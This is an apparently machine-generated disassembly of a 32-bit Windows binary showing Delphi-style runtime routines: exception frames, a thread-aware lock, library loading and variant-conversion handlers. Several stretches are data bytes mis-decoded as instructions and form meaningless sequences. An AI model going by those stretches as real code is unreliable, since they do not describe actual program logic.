call sub_40b0a8
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_4081cc
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b0a8
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_4081cc
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_403fb8
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_403fb8
jmp r-xdata
sub_40cc74
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40cd04
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b05c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cd0b
lea eax [ ebp - 0x14 ]
call sub_403f20
retn
sub_40cd5c
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408630
mov [ rw-data ] eax
sub_40cde0
push ebx
push esi
push edi
push ebp
call sub_40355c
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026fc
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403180
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403544
sub_40ce48
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40ce30
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40ced0
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407c80
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40cdd0
mov [ ebp ] eax
sub_40ced0
push ebx
mov ebx eax
mov eax ebx
call sub_40ce30
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40cdd0
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40cf10
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403160
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_40cf84
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax esi
call sub_40d010
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403190
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_40d010
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cfcc
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40ce48
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40cdd8
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40cdb8
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40cdd8
test eax eax
je r-xdata
mov eax edi
call sub_40cfcc
test bl bl
je r-xdata
mov eax edi
call sub_40d000
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40cdb8
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40cdc4
sub_40d0ac
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ce48
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40cdd8
mov eax ebx
call sub_40cfe4
mov eax ebx
call sub_40cfd8
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cec0
sub_40d0fc
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40ce48
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40cff0
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40cdc4
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40cdb8
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40cff0
mov eax esi
call sub_40cfe4
sub_40d168
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ce48
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cec0
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40cdb8
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40cfe4
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40cfe4
sub_40d1e0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d204
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d27b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_40578c
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_403244
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d282
lea eax [ ebp - 0x4 ]
call sub_40578c
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_403244
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d1e0
test al al
jne r-xdata
mov al 0x1
sub_40d29c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d30e
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d2f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4043e0
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d2f7
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d3d1
fadd [ edi ]
push esp
bound eax [ edi ]
adc dh dl
inc edi
add [ edx + 0x47 ] cl
add ah cl
aad 0x47
add [ edx + 0x47 ] al
add [ edi + edx * 8 + 0x623c0047 ] bl
inc edi
add [ eax + ebx * 8 ] ch
inc edi
add [ edx ] dh
inc edi
add [ edx * 8 + 0x622c0047 ] dh
inc edi
add al bl
fadd [ edi ]
and al 0x62
inc edi
add al dl
salc
inc edi
add [ eax ] ch
add [ eax ] al
add [ edx ] bl
inc edi
add [ eax + 0x47d8 ] bh
add [ eax ] al
add [ eax ] bl
bound eax [ edi ]
je r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ edx ] dl
inc edi
add [ eax + ebx * 8 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] dl
bound eax [ edi ]
inc eax
aad 0x47
add [ eax ] al
add [ eax ] al
add [ edx ] cl
inc edi
add ah ah
aad 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] cl
bound eax [ edi ]
fcom st5
inc edi
add [ eax ] al
add [ eax ] al
add [ edx ] al
inc edi
add [ eax + 0x47d5 ] dl
add [ eax ] al
add [ eax ] al
bound eax [ edi ]
int3
sub_40d495
popad
inc edi
add [ eax - 0x28 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add ah ch
popad
inc edi
add [ eax - 0x28 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add al ch
popad
inc edi
add ah bl
xlat
inc edi
add [ eax ] al
add [ eax ] al
add ah ah
popad
inc edi
add [ eax + 0x47d6 ] bh
add [ eax ] al
add al ah
popad
inc edi
add [ esi + edx * 8 + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add ah bl
popad
inc edi
add [ edx * 8 + 0x47 ] bh
add [ eax ] al
fsub [ ecx + 0x47 ]
add [ eax + ebx * 8 + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add ah dl
popad
inc edi
add [ edi + edx * 8 + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add al dl
popad
inc edi
add [ eax - 0x2a ] dl
inc edi
add [ eax ] al
add [ eax ] al
add ah cl
popad
inc edi
add [ edi + edx * 8 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add al cl
popad
inc edi
add [ edi + edx * 8 + 0x47 ] ch
add [ eax ] al
les esp [ ecx + 0x47 ]
add [ edi + edx * 8 + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add al al
popad
inc edi
add [ eax + 0x47d6 ] cl
add [ eax ] al
add [ ecx - 0x2ac7ffb9 ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x7ffb89f ] bh
salc
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x2703ffb9 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x63ffb89f ] dh
fadd [ edi ]
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
popad
inc edi
add [ eax + 0x47d7 ] dl
add [ eax ] al
add [ eax + 0xc004761 ] ch
salc
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x2aafffb9 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x77ffb89f ] ah
fadd [ edi ]
add [ eax ] al
add [ eax ] al
pushfd
popad
inc edi
add [ eax + 0x47d9 ] bl
add [ eax ] al
add [ eax - 0x67ffb89f ] bl
aad 0x47
add [ eax ] al
add [ eax ] al
add [ ecx - 0x2adbffb9 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x33ffb89f ] dl
fadd [ edi ]
add [ eax ] al
add [ eax ] al
mov [ ecx + 0x47 ] fs
add [ edi + edx * 8 + 0x47 ] cl
add [ eax ] al
mov [ ecx + 0x47 ] ah
add [ eax ] bh
fld [ edi ]
add [ eax ] al
add [ eax ] al
popad
inc edi
add ah bl
salc
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x61 ] ah
inc edi
add [ eax ] bl
salc
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_40d765
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d76c
retn
mov eax rw-data
call sub_40d1d0
call sub_40cd3c
call sub_40bfa4
mov eax rw-data
mov ecx 0x16
mov edx [ sub_40ba7c ]
call sub_40499c
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_40499c
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_40499c
mov eax rw-data
call sub_403f20
mov eax rw-data
mov edx [ r-xdata ]
call sub_4050e0
mov eax rw-data
mov edx [ r-xdata ]
call sub_4050e0
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_40499c
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_40499c
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_40499c
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_40499c
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_40499c
mov eax rw-data
call sub_403f20
mov eax rw-data
call sub_403f20
mov eax rw-data
call sub_403f20
mov eax rw-data
call sub_403f20
mov eax rw-data
call sub_403f20
mov eax rw-data
call sub_403f20
mov eax rw-data
call sub_403f20
mov eax rw-data
call sub_403f20
mov eax rw-data
call sub_404600
mov eax rw-data
call sub_403f20
sub_40d770
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d7d8
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d7df
retn
mov eax r-xdata
call sub_403ccc
mov eax r-xdata
call sub_403cf4
cmp [ rw-data ] 0x0
je r-xdata
call sub_40bf20
call sub_40c024
call sub_40cd5c
call sub_40c8f4
mov eax rw-data
mov edx r-xdata
call sub_403f74
sub_40d810
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d864
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d8be
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041a8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4081e4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d8c5
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_40d8d0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d92a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041a8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409540
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d931
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_40d93c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d996
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041a8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409514
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d99d
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_40d9a8
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40da02
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041a8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40afd0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da09
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_40da14
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40da6e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041a8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40956c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da75
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_40da80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40daed
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4041a8
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_4082f0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40daf4
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
sub_40db00
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40db60
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4094c8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_40474c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db67
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_40db70
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dbd0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a728
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_40474c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dbd7
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_40dbe0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dc44
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_40838c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_40474c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc4b
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_40dc74
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40dca0
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d810
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d840
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d840
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d84c
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d84c
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d84c
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d84c
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d84c
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d84c
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d84c
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d84c
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d84c
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d858
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d864
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8d0
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d93c
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d9a8
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da14
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da80
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db00
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db70
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbe0
mov eax r-xdata
call sub_40dc74
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40dfac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40dfd1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dfd8
retn
sub_40e10c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
loope r-xdata
nop
add [ eax + eax ] cl
add [ eax ] al
pop eax
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bl
inc eax
add [ eax + eax ] cl
add [ eax ] al
pop eax
js r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e1 ] bh
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ esi ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
loop r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e2 ] al
add [ eax ] al
add [ eax + 0x78 ] bl
inc eax
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and dl 0x40
add [ eax + eax ] cl
add [ eax ] al
pop eax
js r-xdata
outsd
jb r-xdata
jo r-xdata
popad
outsb
je r-xdata
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
pop eax
js r-xdata
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
inc ecx
jb r-xdata
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
rcr [ edx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
jae r-xdata
inc ebx
add al ah
xor eax [ eax ]
sub [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0x15004031 ] al
inc ebp
push esi
popad
jb r-xdata
outsb
jbe r-xdata
xor [ eax ] eax
jecxz r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
adc eax 0x72615645
jns r-xdata
add al ah
xor eax [ eax ]
sub [ ecx ] dh
inc eax
outsb
outsd
inc ebp
jb r-xdata
add [ eax ] ch
jb r-xdata
jb r-xdata
popad
outsb
je r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
add [ ecx + esi + 0x40 ] al
add [ eax + 0x15004031 ] al
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1d ] cl
